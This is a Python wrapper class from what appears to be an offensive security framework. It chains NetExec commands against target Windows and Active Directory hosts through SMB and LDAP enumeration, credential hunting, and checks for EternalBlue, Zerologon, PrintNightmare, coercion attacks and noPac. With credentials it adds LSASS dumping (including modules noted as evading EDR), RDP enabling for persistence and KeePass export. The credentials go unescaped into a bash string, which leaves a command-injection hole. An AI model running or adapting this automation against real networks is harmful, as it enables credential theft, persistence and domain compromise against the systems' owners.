import tempfile
from pathlib import Path
from wrappers.base import BaseTool
from core.target import TargetType


class NetExecTool(BaseTool):
    name = "netexec"

    def build_command(self) -> list[str]:
        if not self.binary:
            return []

        t = self.target
        nxc = self.binary

        # ── Resolve target string ────────────────────────────────────
        # nxc natively supports CIDR, file, or single host
        smb_hosts   = self.feed.get("smb_hosts", [])
        amass_hosts = self.feed.get("hosts", [])
        all_hosts   = smb_hosts or amass_hosts

        if all_hosts:
            hosts_file = Path(tempfile.mktemp(prefix="crushgear_nxc_", suffix=".txt"))
            hosts_file.write_text("\n".join(all_hosts) + "\n")
            target_str = str(hosts_file)
        elif t.type == TargetType.CIDR:
            target_str = t.cidr
        else:
            target_str = t.host

        # ── Credential flags ─────────────────────────────────────────
        has_creds = bool(self.username and self.password)
        if has_creds:
            cred = f"-u '{self.username}' -p '{self.password}'"
        else:
            # Null/anonymous session — tests open auth before trying creds
            cred = "-u '' -p ''"

        # ─────────────────────────────────────────────────────────────
        # Phase A: Full SMB Enumeration
        # ─────────────────────────────────────────────────────────────
        # --shares         : list all SMB shares + READ/WRITE permissions
        # --users          : enumerate domain/local users via RPC
        # --groups         : enumerate local/domain groups
        # --pass-pol       : dump password policy (lockout threshold, complexity, age)
        # --rid-brute 5000 : RID cycling (finds hidden users when --users is blocked)
        # --sessions       : list active SMB sessions (who is connected right now)
        # --loggedon-users : list users currently logged on interactively
        # --disks          : list local drives/mounted volumes
        smb_enum = (
            f"{nxc} smb {target_str} {cred} "
            f"--shares --users --groups --pass-pol "
            f"--rid-brute 5000 --sessions --loggedon-users --disks 2>&1"
        )

        # ─────────────────────────────────────────────────────────────
        # Phase B: LDAP Enumeration (Active Directory specific)
        # ─────────────────────────────────────────────────────────────
        # --user-desc           : user Description field (VERY often contains passwords)
        # --active-users        : only show active (non-disabled) accounts
        # --trusted-for-delegation : Kerberos delegation — potential impersonation
        # --password-not-required  : accounts with PASSWD_NOTREQD flag (privesc)
        # --admin-count         : AdminSDHolder protected accounts (high-value targets)
        # --get-sid             : get domain SID (needed for some AD attacks)
        # --gmsa                : Group Managed Service Account secrets (auth bypass)
        # --bloodhound          : dump BloodHound-compatible data (AD attack paths)
        ldap_enum = (
            f"{nxc} ldap {target_str} {cred} "
            f"--user-desc --active-users "
            f"--trusted-for-delegation --password-not-required "
            f"--admin-count --get-sid --gmsa 2>&1"
        )

        # ─────────────────────────────────────────────────────────────
        # Phase C: SMB Modules — Credential & Data Hunting
        # ─────────────────────────────────────────────────────────────
        cred_modules = [
            # --- GPP / Registry credential hunting ---
            "gpp_password",    # GPP passwords in SYSVOL/Policies — VERY common AD finding
            "gpp_autologin",   # Autologin credentials stored in Group Policy registry
            "reg_winlogon",    # Winlogon registry key — stores default logon credentials
            # --- Share & DNS enumeration ---
            "spider_plus",     # Spider ALL readable shares for secrets, configs, DB files
            "enum_dns",        # DNS zone transfer/enumeration via SMB (finds all A records)
            # --- Additional discovery ---
            "ioxidresolver",   # IOXIDResolver — discover additional network interfaces
        ]

        # ─────────────────────────────────────────────────────────────
        # Phase D: Vulnerability Check Modules
        # ─────────────────────────────────────────────────────────────
        vuln_modules = [
            # --- Critical RCE / Takeover ---
            "ms17-010",        # CVE-2017-0144  EternalBlue — Windows SMB RCE (unpatched)
            "zerologon",       # CVE-2020-1472  Netlogon — Domain Controller account takeover
            "printnightmare",  # CVE-2021-34527 Print Spooler — local privesc → RCE

            # --- NTLM Relay Coerce Vectors ---
            "petitpotam",      # CVE-2021-36942 NTLM relay via LSARPC (unauthenticated)
            "dfscoerce",       # CVE-2022-26925 NTLM relay via MS-DFSNM (DFSCoerce)
            "shadowcoerce",    # NTLM relay via MS-FSRVP (Shadow Copy service)
            "printerbug",      # SpoolSample — coerce authentication via MS-RPRN
            "webdav",          # WebDAV check — coerce via WebClient service (HTTP relay)

            # --- Privilege Escalation ---
            "nopac",           # CVE-2021-42278/42287 — AD sAMAccountName spoofing → DA
            "spooler",         # Print Spooler running check (PrintNightmare prerequisite)

            # --- Recon / AV Detection ---
            "enum_av",         # Detect AV/EDR/security products on remote host
        ]

        # ─────────────────────────────────────────────────────────────
        # Phase E: Post-Auth Credential Dumping (only with valid creds)
        # ─────────────────────────────────────────────────────────────
        # Only run when credentials are provided — these require auth
        postauth_modules = [
            # --- LSASS credential dumping ---
            "lsassy",          # Remote LSASS dump via various methods (no binary on target)
            "nanodump",        # Stealthy LSASS dump — minimal EDR footprint
            "handlekatz",      # LSASS dump via handle duplication (bypasses some AV)
            "mimikatz",        # Full credential dump via mimikatz (classic, noisy)
            # --- Persistence ---
            "rdp",             # Enable RDP for persistent remote access
            # --- Password Manager hunting ---
            "keepass_discover",# Locate KeePass databases (.kdbx) on remote host
            "keepass_trigger", # Export KeePass database using trigger mechanism
        ]

        # ─────────────────────────────────────────────────────────────
        # Build the complete bash script
        # ─────────────────────────────────────────────────────────────
        parts = [
            "echo ''; echo '=== NetExec: Phase A — SMB Enumeration ==='",
            smb_enum,
            "echo ''; echo '=== NetExec: Phase B — LDAP / Active Directory ==='",
            ldap_enum,
            "echo ''; echo '=== NetExec: Phase C — Credential Hunting (GPP/Registry/Spider) ==='",
        ]

        for mod in cred_modules:
            parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        parts += [
            "echo ''; echo '=== NetExec: Phase D — Vulnerability Checks ==='",
        ]
        for mod in vuln_modules:
            parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        if has_creds:
            parts += [
                "echo ''; echo '=== NetExec: Phase E — Post-Auth Credential Dumping ==='",
            ]
            for mod in postauth_modules:
                parts.append(f"{nxc} smb {target_str} {cred} -M {mod} 2>&1")

        return ["bash", "-c", "; ".join(parts)]
